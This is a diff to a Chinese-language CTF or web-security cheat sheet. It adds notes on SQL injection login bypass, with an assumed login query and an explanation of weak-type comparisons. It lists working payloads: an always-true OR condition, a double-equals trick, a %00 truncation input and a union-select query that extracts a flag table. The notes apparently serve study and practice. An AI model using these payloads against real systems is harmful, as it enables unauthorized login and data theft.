@@ -14,13 +14,22 @@
 .index.php.swp 文件可能隐藏源代码
 16进制编码可以绕过注入
 
-## 简单绕过，万能密码
-
+## sql绕过，万能密码
+假设sql语句如下：
+select * from user where username='用户名' and password='密码'  
+---
+### 数据类型
+sql里面弱类型的比较，以下情况都会为true：
+- 1='1'
+- 1='1.0'
+- 1='1后接字母(再后面有数字也可以)'
+- 0='除了非0数字开头的字符串'
     uname=admin
-
     &passwd=admin'||'1'='1
-
-    &submit=Submit
+### 双等号
+username=p'='&password=p'='
+### 特殊截断符号“%00
+username=a'+0;%00&password=
 ## 回显注入
 ?name=admin' and 1=2 union select 1,2,group_concat(flag) from flag--+
 ## 延时注入
